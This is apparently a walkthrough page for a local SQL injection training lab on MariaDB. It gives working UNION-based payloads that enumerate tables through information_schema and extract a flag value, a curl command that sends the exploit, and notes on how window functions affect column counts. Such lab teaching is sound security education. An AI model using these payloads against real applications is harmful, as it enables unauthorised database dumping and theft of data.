<h4>Step 1: Observe the Window Function Query</h4>
<p>
    Search for a player name and notice the query uses <code>ROW_NUMBER() OVER()</code>
    to compute rankings. This means the result set has 4 columns.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>Dragon<br>
        <span class="prompt">SQL: </span>SELECT player, score, ROW_NUMBER() OVER (ORDER BY score DESC) as rank_num, 'leaderboard' as source FROM scores WHERE player LIKE '%Dragon%'<br><br>
        <span class="prompt">Output:</span><br>
        Rank: #1 | Player: DragonSlayer | Score: 9500 | Source: leaderboard
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MariaDB Error:</strong> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
    </div>
</div>

<h4>Step 3: Enumerate Tables</h4>
<p>
    Use UNION with 4 columns to discover hidden tables. Using a non-matching prefix suppresses
    normal results so only injected rows appear.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -<br><br>
        <span class="prompt">Output:</span><br>
        Rank: # | Player: scores<br>
        Rank: # | Player: <strong>window_flags</strong>
    </div>
</div>

<h4>Step 4: Extract Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Simple UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT flag_value, NULL, NULL, NULL FROM window_flags -- -<br><br>
        <span class="prompt">Output:</span><br>
        Rank: # | Player: <strong>FLAG{ma_w1nd0w_func_3xtr4ct}</strong>
    </div>
</div>

<h4>Step 5: Using Window Functions in UNION Payload</h4>
<p>
    You can use window functions in the injected UNION query itself.
    <code>ROW_NUMBER() OVER()</code> assigns row numbers to extracted data.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Window Function in UNION</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT flag_value, 9999, ROW_NUMBER() OVER(), 'injected' FROM window_flags -- -<br><br>
        <span class="prompt">Output:</span><br>
        Rank: #1 | Player: <strong>FLAG{ma_w1nd0w_func_3xtr4ct}</strong> | Score: 9999 | Source: injected
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag value and paste it into the verification form:
    <code>FLAG{ma_w1nd0w_func_3xtr4ct}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab8" \<br> --data-urlencode "player=XYZNOTEXIST' UNION SELECT flag_value, NULL, NULL, NULL FROM window_flags -- -"<br><br>
        <span class="prompt">Result: </span>Rank: # | Player: <strong>FLAG{ma_w1nd0w_func_3xtr4ct}</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Window functions (<code>ROW_NUMBER()</code>, <code>RANK()</code>,
    <code>DENSE_RANK()</code>, <code>NTILE()</code>) are available in MariaDB 10.2+ and add a computed
    column to results without collapsing rows. For injection, this means: (1) the column count increases
    by the number of window function columns, (2) window functions can be used in UNION payloads to
    mimic the original query's format, (3) <code>OVER(ORDER BY (SELECT ...))</code> can embed subqueries
    in the ordering expression. The key insight is that window functions change the column count, which
    affects how you build your UNION payload.
</div>
